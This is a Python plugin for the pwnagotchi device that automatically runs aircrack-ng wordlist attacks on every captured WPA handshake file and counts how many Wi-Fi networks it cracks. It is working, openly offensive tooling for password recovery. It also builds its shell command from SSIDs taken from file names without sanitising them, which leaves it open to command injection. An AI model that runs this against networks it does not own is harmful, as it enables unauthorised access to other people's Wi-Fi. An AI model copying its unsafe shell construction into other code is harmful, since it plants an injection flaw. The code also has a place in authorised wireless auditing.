import os
import json
import time
import logging
import threading
import subprocess
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.fonts as fonts
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK

class BruteForce(plugins.Plugin):
    __author__ = 'Your Name'
    __version__ = '1.4.2'
    __license__ = 'GPL3'
    __description__ = 'A plugin to brute force WPA handshakes using aircrack-ng.'

    def __init__(self):
        self.wordlist = "/home/pi/wordlists/top62.txt"  # Path to your wordlist
        self.handshake_dir = "/home/pi/handshakes"  # Directory containing handshakes
        self.status = "IDLE"  # Default status is idle
        self.progress = "0%"
        self.result = ""
        self.ui = None
        self.lock = threading.Lock()
        self.processed_files = 0
        self.total_files = 0
        self.cracked_count = 0  # Counter for cracked networks
        self.current_task = None
        self.delay_between_attempts = 10  # Delay in seconds between brute force attempts
        self.progress_file = "/root/bruteforce_progress.json"  # File to save progress
        self.processed_files_set = set()  # Set to keep track of processed files

    def on_loaded(self):
        logging.info("[bruteforce] Plugin loaded.")
        self.load_progress()  # Load saved progress if it exists
        self.count_handshake_files()
        self.start_monitoring()

    def on_ui_setup(self, ui):
        self.ui = ui
        # Set up the UI display elements (positions remain unchanged)
        ui.add_element("bruteforce_status", LabeledValue(color=BLACK, label="BF:", value=self.status,
            position=(128, 60), label_font=fonts.Bold, text_font=fonts.Medium))
        ui.add_element("bruteforce_progress", LabeledValue(color=BLACK, label="PR:", value=self.progress,
            position=(188, 60), label_font=fonts.Bold, text_font=fonts.Medium))
        ui.add_element("bruteforce_result", LabeledValue(color=BLACK, label="RE:", value=self.result,
            position=(128, 68), label_font=fonts.Bold, text_font=fonts.Medium))
        ui.add_element("bruteforce_total", LabeledValue(color=BLACK, label="TO:", value=f"{self.processed_files}/{self.total_files}",
            position=(188, 68), label_font=fonts.Bold, text_font=fonts.Medium))

        # Display the cracked/total processed networks
        ui.add_element("bruteforce_cracked", LabeledValue(color=BLACK, label="CR:", value=f"{self.cracked_count}/{self.processed_files}",
            position=(133, 1), label_font=fonts.Bold, text_font=fonts.Medium))

    def on_ui_update(self, ui):
        if self.ui:  # Only update the UI if it's been set
            with ui._lock:
                ui.set("bruteforce_status", self.status)
                ui.set("bruteforce_progress", self.progress)
                ui.set("bruteforce_result", self.result)
                ui.set("bruteforce_total", f"{self.processed_files}/{self.total_files}")
                ui.set("bruteforce_cracked", f"{self.cracked_count}/{self.processed_files}")  # Cracked/processed count

    def start_monitoring(self):
        logging.info("[bruteforce] Monitoring handshakes.")
        thread = threading.Thread(target=self.monitor_handshakes, daemon=True)
        thread.start()

    def monitor_handshakes(self):
        while True:
            for root, dirs, files in os.walk(self.handshake_dir):
                for file in files:
                    if file.endswith(".pcap"):
                        pcap_file = os.path.join(root, file)
                        if pcap_file not in self.processed_files_set:
                            self.run_bruteforce(pcap_file)
                            time.sleep(self.delay_between_attempts)  # Delay between processing files
            time.sleep(10)  # Polling interval

    def run_bruteforce(self, pcap_file):
        with self.lock:
            if self.current_task is None:
                if pcap_file in self.processed_files_set:
                    return  # Skip processing if already processed
                self.processed_files_set.add(pcap_file)
                self.status = "PROCESS"  # Update status to processing
                self.on_ui_update(self.ui)  # Update the UI to show current status

                ssid = os.path.basename(pcap_file).split("_")[0][:4]  # Show only first 4 letters of SSID
                output_file = f"/root/bruteforce/bruteforce_{ssid}.txt"
                command = f"aircrack-ng -w {self.wordlist} -e {ssid} {pcap_file}"

                logging.info(f"[bruteforce] Running brute force command: {command}")
                self.status = "BRUTE"  # Update status to brute forcing
                self.progress = "0%"
                self.result = ""
                self.on_ui_update(self.ui)

                try:
                    # Run the aircrack-ng command and capture output and errors
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    self.current_task = process

                    stdout, stderr = process.communicate(timeout=300)  # Set timeout for 5 minutes
                    stdout_decoded = stdout.decode('utf-8')
                    stderr_decoded = stderr.decode('utf-8')

                    logging.info(f"[bruteforce] aircrack-ng output: {stdout_decoded}")
                    if stderr:
                        logging.error(f"[bruteforce] aircrack-ng error: {stderr_decoded}")

                    if process.returncode == 0:
                        self.progress = "100%"
                        if "KEY FOUND!" in stdout_decoded:
                            self.result = "Cracked"
                            self.cracked_count += 1  # Increment the cracked network count
                        else:
                            self.result = "Failed"
                    else:
                        self.result = "Failed"

                    logging.info(f"[bruteforce] Brute force attack {self.result}.")

                except subprocess.TimeoutExpired:
                    logging.error("[bruteforce] aircrack-ng command timed out")
                    process.kill()
                    self.result = "Timeout"

                self.status = "DONE"  # Update status to done
                self.processed_files += 1  # Increment the count of processed files
                self.save_progress()  # Save progress after each file
                self.on_ui_update(self.ui)

                # Reset task after completion
                self.current_task = None

    def count_handshake_files(self):
        self.total_files = sum([len([f for f in files if f.endswith('.pcap')]) for r, d, files in os.walk(self.handshake_dir)])
        logging.info(f"[bruteforce] Found {self.total_files} handshake files.")

    # Function to save progress
    def save_progress(self):
        progress_data = {
            'processed_files': self.processed_files,
            'cracked_count': self.cracked_count,
            'processed_files_list': list(self.processed_files_set)
        }
        with open(self.progress_file, 'w') as f:
            json.dump(progress_data, f)
        logging.info(f"[bruteforce] Progress saved: {progress_data}")

    # Function to load progress
    def load_progress(self):
        if os.path.exists(self.progress_file):
            with open(self.progress_file, 'r') as f:
                progress_data = json.load(f)
                self.processed_files = progress_data.get('processed_files', 0)
                self.cracked_count = progress_data.get('cracked_count', 0)
                processed_files_list = progress_data.get('processed_files_list', [])
                self.processed_files_set = set(processed_files_list)
            logging.info(f"[bruteforce] Progress loaded: {progress_data}")
        else:
            logging.info("[bruteforce] No saved progress found.")
